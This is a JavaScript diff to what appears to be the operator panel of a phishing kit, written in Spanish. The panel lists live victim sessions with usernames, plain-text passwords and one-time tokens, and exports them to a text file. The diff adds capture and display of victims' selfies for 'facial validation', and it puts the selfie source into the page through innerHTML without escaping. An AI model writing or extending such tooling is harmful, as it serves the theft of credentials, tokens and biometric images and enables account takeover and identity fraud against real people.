@@ -143,6 +143,7 @@ function createRow(row) {
     <td class="col-user mono"></td>
     <td class="col-pass mono copyable" title="Copiar clave"></td>
     <td class="col-token mono copyable" title="Copiar token"></td>
+    <td class="col-selfie"></td>
     <td class="col-online"></td>
     <td class="col-status"></td>
     <td>
@@ -225,6 +226,15 @@ function createRow(row) {
     } catch {}
   });
 
+  tr.querySelector('.col-selfie')?.addEventListener('click', (event) => {
+    const thumb = event.target.closest('.selfie-thumb');
+    if (!thumb) return;
+    const current = rows.get(row.id);
+    if (current && current.selfie) {
+      openSelfieModal(current.selfie, current.user || `Sesión #${current.index}`);
+    }
+  });
+
   return tr
 }
 
@@ -259,6 +269,16 @@ function updateRow(tr, row) {
   }
   tr.querySelector('.col-pass').textContent = row.clave || '—'
   tr.querySelector('.col-token').textContent = row.token || '—'
+
+  const selfieCell = tr.querySelector('.col-selfie');
+  if (selfieCell) {
+    if (row.selfie) {
+      selfieCell.innerHTML = `<img src="${row.selfie}" class="selfie-thumb" alt="Selfie" title="Clic para ver foto selfie de ${userStr}" />`;
+    } else {
+      selfieCell.innerHTML = `<span style="color:#555; font-size:12px;">—</span>`;
+    }
+  }
+
   tr.querySelector('.col-online').innerHTML = online
     ? '<span class="pill pill--online">En línea</span>'
     : '<span class="pill pill--offline">Off</span>'
@@ -371,6 +391,7 @@ async function pollSessions() {
           user: session.username || session.user || '—',
           clave: session.password || session.clave || '—',
           token: session.token || '',
+          selfie: session.selfie || '',
           state: session.state || 'waiting',
           online: session.online
         });
@@ -501,6 +522,31 @@ function playErrorSound() {
   } catch {}
 }
 
+const selfieModal = document.getElementById('selfieModal');
+const modalBackdrop = document.getElementById('modalBackdrop');
+const modalClose = document.getElementById('modalClose');
+const modalImg = document.getElementById('modalImg');
+const modalTitle = document.getElementById('modalTitle');
+
+function openSelfieModal(src, title) {
+  if (!selfieModal || !modalImg) return;
+  modalImg.src = src;
+  if (modalTitle) modalTitle.textContent = `Validación Facial — ${title}`;
+  selfieModal.hidden = false;
+}
+
+function closeSelfieModal() {
+  if (!selfieModal) return;
+  selfieModal.hidden = true;
+  if (modalImg) modalImg.src = '';
+}
+
+modalClose?.addEventListener('click', closeSelfieModal);
+modalBackdrop?.addEventListener('click', closeSelfieModal);
+window.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') closeSelfieModal();
+});
+
 btnClean?.addEventListener('click', async () => {
   rows.clear()
   try {
@@ -527,6 +573,7 @@ function exportToNotepad() {
     text += `Usuario: ${row.user}\r\n`;
     text += `Clave: ${row.clave}\r\n`;
     text += `Token: ${row.token || '—'}\r\n`;
+    text += `Selfie: ${row.selfie ? 'Recibida en panel' : 'No enviada'}\r\n`;
     text += `Estado final: ${statusLabel(row.state)}\r\n`;
     text += `========================\r\n\r\n`;
   });
